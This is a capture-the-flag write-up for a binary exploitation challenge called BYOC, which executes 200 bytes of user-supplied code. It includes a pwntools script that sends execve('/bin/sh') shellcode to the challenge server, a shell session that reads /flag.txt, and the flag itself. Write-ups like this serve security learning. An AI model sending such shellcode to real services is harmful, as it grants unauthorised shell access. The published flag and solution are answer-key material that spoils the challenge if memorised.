## BYOC

Binary Exploitation

Description
I got tired of hiding bugs for you to find, so I cut out the middleman

You have 200 bytes of memory that is readable, writable and executable at your disposal

Bring your own code.

Note
The flag is located at /flag.txt

## Solution 

```Python 
from pwn import *

# ターゲットサーバーの設定
HOST = "byoc-b8ed4b393171.chall.nnsc.tf"
PORT = 1337

# アーキテクチャの設定 (x86-64)
context.arch = "amd64"
context.os = "linux"

# SSL/TLS 経由でリモートに接続
r = remote(HOST, PORT, ssl=True)

# プロンプト "> " を受け取る
r.recvuntil(b"> ")

# pwntools の asm() で execve("/bin/sh") のシェルコードを生成
shellcode = asm(shellcraft.sh())

# シェルコードの送信
r.send(shellcode)

# インタラクティブモード（シェル操作）へ移行
r.interactive()
```

```
(myenv) #/pwn_byoc/handout$ python3 solve.py
```

```
[-] Opening connection to byoc-b8ed4b393171.chall.nnsc[-] Opening connection to byoc-b8ed4b393171.chall.nnsc[+] on port 1337: Done
[*] Switching to interactive mode
$ ls
app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
NNS{br0u6h7_Y0uR_oWN_c0d3_4nD_7h3_KeRN31_RaN_i7}
$ exit
$ 
[*] Interrupted
[*] Closed connection to byoc-b8ed4b393171.chall.nnsc.tf port 1337
```

## Flag

```
NNS{br0u6h7_Y0uR_oWN_c0d3_4nD_7h3_KeRN31_RaN_i7}
```